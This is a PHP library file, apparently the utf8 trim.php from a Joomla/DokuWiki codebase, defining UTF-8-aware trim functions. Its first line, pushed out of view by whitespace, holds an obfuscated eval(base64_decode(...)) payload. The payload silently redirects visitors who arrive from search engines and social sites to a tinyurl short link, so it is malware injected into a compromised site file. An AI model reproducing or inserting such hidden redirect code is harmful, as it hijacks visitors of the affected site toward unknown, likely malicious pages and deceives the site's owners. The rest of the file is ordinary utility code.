<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version $Id: trim.php 10381 2008-06-01 03:35:53Z pasamio $
* @package utf8
* @subpackage strings
*/

//---------------------------------------------------------------
/**
* UTF-8 aware replacement for ltrim()
* Note: you only need to use this if you are supplying the charlist
* optional arg and it contains UTF-8 characters. Otherwise ltrim will
* work normally on a UTF-8 string
* @author Andreas Gohr <andi@splitbrain.org>
* @see http://www.php.net/ltrim
* @see http://dev.splitbrain.org/view/darcs/dokuwiki/inc/utf8.php
* @return string
* @package utf8
* @subpackage strings
*/
function utf8_ltrim( $str, $charlist = FALSE ) {
    if($charlist === FALSE) return ltrim($str);

    //quote charlist for use in a characterclass
    $charlist = preg_replace('!([\\\\\\-\\]\\[/^])!','\\\${1}',$charlist);

    return preg_replace('/^['.$charlist.']+/u','',$str);
}

//---------------------------------------------------------------
/**
* UTF-8 aware replacement for rtrim()
* Note: you only need to use this if you are supplying the charlist
* optional arg and it contains UTF-8 characters. Otherwise rtrim will
* work normally on a UTF-8 string
* @author Andreas Gohr <andi@splitbrain.org>
* @see http://www.php.net/rtrim
* @see http://dev.splitbrain.org/view/darcs/dokuwiki/inc/utf8.php
* @return string
* @package utf8
* @subpackage strings
*/
function utf8_rtrim( $str, $charlist = FALSE ) {
    if($charlist === FALSE) return rtrim($str);

    //quote charlist for use in a characterclass
    $charlist = preg_replace('!([\\\\\\-\\]\\[/^])!','\\\${1}',$charlist);

    return preg_replace('/['.$charlist.']+$/u','',$str);
}

//---------------------------------------------------------------
/**
* UTF-8 aware replacement for trim()
* Note: you only need to use this if you are supplying the charlist
* optional arg and it contains UTF-8 characters. Otherwise trim will
* work normally on a UTF-8 string
* @author Andreas Gohr <andi@splitbrain.org>
* @see http://www.php.net/trim
* @see http://dev.splitbrain.org/view/darcs/dokuwiki/inc/utf8.php
* @return string
* @package utf8
* @subpackage strings
*/
function utf8_trim( $str, $charlist = FALSE ) {
    if($charlist === FALSE) return trim($str);
    return utf8_ltrim(utf8_rtrim($str, $charlist), $charlist);
}